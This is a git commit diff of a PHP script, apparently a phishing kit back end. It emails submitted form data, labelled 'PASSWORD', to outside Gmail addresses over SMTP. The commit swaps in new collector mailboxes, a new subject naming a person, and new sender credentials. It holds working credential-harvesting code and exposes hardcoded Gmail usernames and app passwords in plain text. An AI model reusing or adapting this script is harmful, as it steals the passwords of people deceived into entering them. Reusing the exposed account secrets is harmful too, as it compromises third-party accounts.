fb1a0a4fe380c6ad4fa859418885512be7b2a682
adiwalfare <ronimawiads@gmail.com>
2025-08-07 14:12:02 +0500

    Update and rename mkpass.php to RajeshParmarpass.php

--- RajeshParmarpass.php
+++ RajeshParmarpass.php
@@ -27,8 +27,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('rutherfordhenress@gmail.com', 'PASSWORD');
         $mail->addAddress('rutherfordhenress@gmail.com');
-        $mail->addAddress('angel.loura.ads.info@gmail.com');
+        $mail->addAddress('official.qadanthakur@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MUKHTIYAR';
+        $mail->Subject = 'Rajesh Parmar';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
